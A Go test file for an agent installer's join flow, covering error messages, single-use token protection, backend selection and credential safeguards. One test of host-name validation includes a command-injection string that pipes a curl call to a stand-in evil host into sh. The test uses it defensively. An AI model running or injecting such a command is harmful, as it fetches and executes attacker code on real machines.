package installer

import (
	"context"
	"crypto/x509"
	"errors"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/eyupio/zoomies/internal/agent"
)

func TestExplainJoinErrorNamesTheRemedy(t *testing.T) {
	opts := JoinOptions{ControllerURL: "https://zoomies.example.com"}

	cases := []struct {
		name string
		err  error
		want []string
	}{
		{
			name: "a token that is expired or already used",
			err:  fmt.Errorf("joining: %w", agent.ErrUnauthorized),
			want: []string{"expired", "already been used", "join-token create"},
		},
		{
			name: "a 401 from the transport",
			err:  &agent.HTTPError{Status: http.StatusUnauthorized, Method: "POST", Path: "/api/v1/agent/join"},
			want: []string{"expired", "join-token create"},
		},
		{
			name: "a host the controller has forgotten",
			err:  fmt.Errorf("joining: %w", agent.ErrHostGone),
			want: []string{"fresh join token"},
		},
		{
			name: "a certificate nothing here trusts",
			err:  &url.Error{Op: "Post", URL: "https://zoomies.example.com", Err: x509.UnknownAuthorityError{}},
			want: []string{"--ca-file", "impersonate"},
		},
		{
			name: "a certificate for another name",
			err:  &url.Error{Op: "Post", URL: "https://zoomies.example.com", Err: x509.HostnameError{Host: "other.example.com"}},
			want: []string{"other.example.com", "certificate"},
		},
		{
			name: "a name that does not resolve",
			err:  &net.DNSError{Name: "zoomies.example.com", Err: "no such host", IsNotFound: true},
			want: []string{"does not resolve"},
		},
		{
			name: "a controller nothing can reach",
			err:  &net.OpError{Op: "dial", Net: "tcp", Err: errors.New("connection refused")},
			want: []string{"could not reach", "outbound", "firewall"},
		},
		{
			name: "an endpoint that is not a controller",
			err:  &agent.HTTPError{Status: http.StatusNotFound, Method: "POST", Path: "/api/v1/agent/join"},
			want: []string{"no join endpoint", "reverse proxy"},
		},
		{
			name: "a controller that never answered",
			err:  &url.Error{Op: "Post", URL: "https://zoomies.example.com", Err: context.DeadlineExceeded},
			want: []string{"did not answer in time"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := explainJoinError(tc.err, opts)
			if got == nil {
				t.Fatal("want an explained error")
			}
			for _, want := range tc.want {
				if !strings.Contains(got.Error(), want) {
					t.Errorf("the message should mention %q:\n%v", want, got)
				}
			}
			if !errors.Is(got, tc.err) && !strings.Contains(got.Error(), tc.err.Error()) {
				t.Errorf("the original failure must survive for the logs:\n%v", got)
			}
		})
	}
}

func TestExplainJoinErrorPassesThroughWhatItCannotImprove(t *testing.T) {
	want := errors.New("something nobody predicted")
	if got := explainJoinError(want, JoinOptions{}); !errors.Is(got, want) {
		t.Fatalf("an unrecognised error must reach the operator unchanged, got %v", got)
	}
	if explainJoinError(nil, JoinOptions{}) != nil {
		t.Fatal("no error means no error")
	}
}

func TestJoinNeedsAControllerAndAToken(t *testing.T) {
	ctx := context.Background()
	base := JoinOptions{
		ConfigDir: t.TempDir(),
		StateDir:  t.TempDir(),
		Out:       &strings.Builder{},
		detection: &Detection{OS: "linux", Arch: "amd64", Hostname: "build-01"},
	}

	err := Join(ctx, base)
	if err == nil || !strings.Contains(err.Error(), "no controller URL") {
		t.Fatalf("want a message naming the missing controller, got: %v", err)
	}

	withURL := base
	withURL.ControllerURL = "https://zoomies.example.com"
	err = Join(ctx, withURL)
	if err == nil || !strings.Contains(err.Error(), "join token") {
		t.Fatalf("want a message naming the missing token and how to mint one, got: %v", err)
	}
	if !strings.Contains(err.Error(), "join-token create") {
		t.Fatalf("the error should say how to get a token: %v", err)
	}
}

// The join token is single-use, so a join that spends it and then fails at
// the unit file -- /etc/systemd/system needs root -- leaves the operator with a
// dead token, credentials in their home directory and an offline host on the
// controller. The refusal has to come before the controller is contacted.
func TestJoinRefusesASystemdUnitItCannotWriteBeforeSpendingTheToken(t *testing.T) {
	cases := []struct {
		name      string
		detection Detection
		service   ServiceKind
		refused   bool
	}{
		{
			name:      "a user without root on a systemd host",
			detection: Detection{OS: "linux", Arch: "amd64", Hostname: "build-01", HasSystemd: true},
			refused:   true,
		},
		{
			name:      "a unit asked for outright on a host that would not have chosen one",
			detection: Detection{OS: "linux", Arch: "amd64", Hostname: "build-01"},
			service:   ServiceSystemd,
			refused:   true,
		},
		{
			// --no-service is the escape hatch: the operator has said they will
			// run the agent themselves, so nothing needs root.
			name:      "a user without root who asks for no service",
			detection: Detection{OS: "linux", Arch: "amd64", Hostname: "build-01", HasSystemd: true},
			service:   ServiceNone,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var contacted atomic.Int32
			srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				contacted.Add(1)
				http.Error(w, "no", http.StatusUnauthorized)
			}))
			t.Cleanup(srv.Close)

			stateDir := t.TempDir()
			det := tc.detection
			err := Join(context.Background(), JoinOptions{
				ControllerURL:     srv.URL,
				JoinToken:         "zoojoin_test",
				ConfigDir:         t.TempDir(),
				StateDir:          stateDir,
				Service:           tc.service,
				AllowInsecureHTTP: true,
				Out:               &strings.Builder{},
				detection:         &det,
			})
			if err == nil {
				t.Fatal("the join has no controller that accepts it, so it must fail somewhere")
			}
			if !tc.refused {
				if contacted.Load() == 0 {
					t.Fatalf("a join that needs no root should reach the controller, got: %v", err)
				}
				return
			}
			for _, want := range []string{"root", "sudo", "--no-service"} {
				if !strings.Contains(err.Error(), want) {
					t.Errorf("the refusal should mention %q:\n%v", want, err)
				}
			}
			if n := contacted.Load(); n != 0 {
				t.Errorf("the controller was contacted %d times; that spends the single-use join token", n)
			}
			if _, statErr := os.Stat(filepath.Join(stateDir, "work")); statErr == nil {
				t.Error("nothing should be written before the refusal")
			}
		})
	}
}

func TestBuildRegistryRefusesAHostWithNoBackend(t *testing.T) {
	ctx := context.Background()
	det := Detection{OS: "linux", Arch: "amd64"} // nothing detected

	// An empty work directory would also stop the process backend from being
	// built, which is the "nothing at all" case an agent must refuse.
	_, _, err := buildRegistry(ctx, det, JoinOptions{}, "")
	if err == nil {
		t.Fatal("an agent with no usable backend must be refused at join time")
	}
	if !strings.Contains(err.Error(), "no usable backend") {
		t.Fatalf("the error should say what is wrong, got: %v", err)
	}
}

func TestBuildRegistryFallsBackToTheProcessBackend(t *testing.T) {
	ctx := context.Background()
	det := Detection{OS: "linux", Arch: "amd64"}

	registry, kind, err := buildRegistry(ctx, det, JoinOptions{}, t.TempDir())
	if err != nil {
		t.Fatalf("buildRegistry: %v", err)
	}
	if kind != "process" {
		t.Fatalf("with no container runtime the only choice is the process backend, got %q", kind)
	}
	if _, err := registry.Get(kind); err != nil {
		t.Fatalf("the chosen backend must be in the registry: %v", err)
	}
}

func TestBuildRegistryRefusesABackendThatIsNotThere(t *testing.T) {
	ctx := context.Background()
	_, _, err := buildRegistry(ctx, Detection{}, JoinOptions{Backend: "docker"}, t.TempDir())
	if err == nil {
		t.Skip("this host has a working Docker socket, so there is nothing to refuse")
	}
	if !strings.Contains(err.Error(), "docker") {
		t.Fatalf("the error should name the backend that was asked for, got: %v", err)
	}
}

func TestConfirmRejoinRefusesToReplaceCredentialsUnasked(t *testing.T) {
	workDir := t.TempDir()
	creds := agent.Credentials{HostID: "host_abc", AgentToken: "zooagt_secret", Controller: "https://zoomies.example.com"}
	if err := agent.Save(agent.StatePath(workDir), creds); err != nil {
		t.Fatalf("Save: %v", err)
	}

	var out strings.Builder
	opts := JoinOptions{NonInteractive: true, Out: &out, In: strings.NewReader("")}
	err := confirmRejoin(opts, newUI(&out), workDir)
	if err == nil {
		t.Fatal("replacing an existing identity must be asked for")
	}
	if !strings.Contains(err.Error(), "--yes") {
		t.Fatalf("the error should say how to proceed, got: %v", err)
	}
	if strings.Contains(out.String(), "zooagt_secret") {
		t.Fatal("the agent token must never be printed")
	}

	opts.AssumeYes = true
	if err := confirmRejoin(opts, newUI(&out), workDir); err != nil {
		t.Fatalf("--yes should proceed: %v", err)
	}
}

func TestConfirmRejoinIsQuietOnAFreshHost(t *testing.T) {
	var out strings.Builder
	opts := JoinOptions{NonInteractive: true, Out: &out, In: strings.NewReader("")}
	if err := confirmRejoin(opts, newUI(&out), t.TempDir()); err != nil {
		t.Fatalf("a host that has never joined has nothing to confirm: %v", err)
	}
	if out.String() != "" {
		t.Fatalf("nothing should have been printed:\n%s", out.String())
	}
}

// The last screen of a join has to say what this host became.
//
// It used to say the host name, the log command and "it should be on the Hosts
// page within a heartbeat" -- nothing about which build the agent is, which
// build the controller is, or what the machine measured. All three are answered
// by running the install again with different arguments, and none was visible
// until somebody opened the Hosts page and read a badge, which is how a host
// sat on 0.2-beta reporting no size at all for as long as nobody looked.
func TestReportedSizeSaysWhatTheAgentMeasuredOrThatItCouldNot(t *testing.T) {
	for _, tc := range []struct {
		name string
		in   agent.Reported
		want []string
		not  []string
	}{
		{
			name: "a machine it measured",
			in:   agent.Reported{CPUs: 12, MemoryMB: 31 * 1024, DiskTotalMB: 108 * 1024, DiskFreeMB: 15 * 1024},
			want: []string{"12 vCPU", "31 GB", "15 GB free of 108"},
		},
		{
			// An agent from before the machine package existed sends nothing,
			// and an empty field would read as "nothing to say" when what it
			// means is "this host cannot say".
			name: "an agent too old to measure",
			in:   agent.Reported{},
			want: []string{"not reported"},
			not:  []string{"0 vCPU"},
		},
		{
			name: "cpus but no disk",
			in:   agent.Reported{CPUs: 4, MemoryMB: 8 * 1024},
			want: []string{"4 vCPU", "8 GB"},
			not:  []string{"free of"},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := reportedSize(tc.in)
			for _, w := range tc.want {
				if !strings.Contains(got, w) {
					t.Errorf("reportedSize(%+v) = %q, want it to carry %q", tc.in, got, w)
				}
			}
			for _, n := range tc.not {
				if strings.Contains(got, n) {
					t.Errorf("reportedSize(%+v) = %q, should not carry %q", tc.in, got, n)
				}
			}
		})
	}
}

// A name the controller would refuse is found out here, before the controller
// is contacted. Left to the controller the join is still refused and the token
// still unspent, but the answer arrives as a 422 the agent reads as a rejected
// join token, and the operator is told to mint another for a token that was
// never the trouble.
func TestJoinRefusesAHostNameTheControllerWouldRefuseBeforeContactingIt(t *testing.T) {
	for name, host := range map[string]string{
		"backticks around a command": "a`curl evil.example|sh`b",
		"a line break":               "two\nlines",
		"a paragraph":                strings.Repeat("a", 129),
	} {
		t.Run(name, func(t *testing.T) {
			var contacted atomic.Int32
			srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				contacted.Add(1)
				http.Error(w, "no", http.StatusUnauthorized)
			}))
			t.Cleanup(srv.Close)

			stateDir := t.TempDir()
			err := Join(context.Background(), JoinOptions{
				ControllerURL:     srv.URL,
				JoinToken:         "zoojoin_test",
				Name:              host,
				ConfigDir:         t.TempDir(),
				StateDir:          stateDir,
				Service:           ServiceNone,
				AllowInsecureHTTP: true,
				Out:               &strings.Builder{},
				detection:         &Detection{OS: "linux", Arch: "amd64", Hostname: "build-01"},
			})
			if err == nil {
				t.Fatalf("a join as %q went ahead", host)
			}
			for _, want := range []string{"--name", "nothing has been redeemed"} {
				if !strings.Contains(err.Error(), want) {
					t.Errorf("the refusal should mention %q:\n%v", want, err)
				}
			}
			if strings.Contains(err.Error(), "evil.example") {
				t.Errorf("the refusal repeats the name it refuses: %v", err)
			}
			if n := contacted.Load(); n != 0 {
				t.Errorf("the controller was contacted %d times; that spends the single-use join token", n)
			}
			if _, statErr := os.Stat(filepath.Join(stateDir, "work")); statErr == nil {
				t.Error("nothing should be written before the refusal")
			}
		})
	}
}
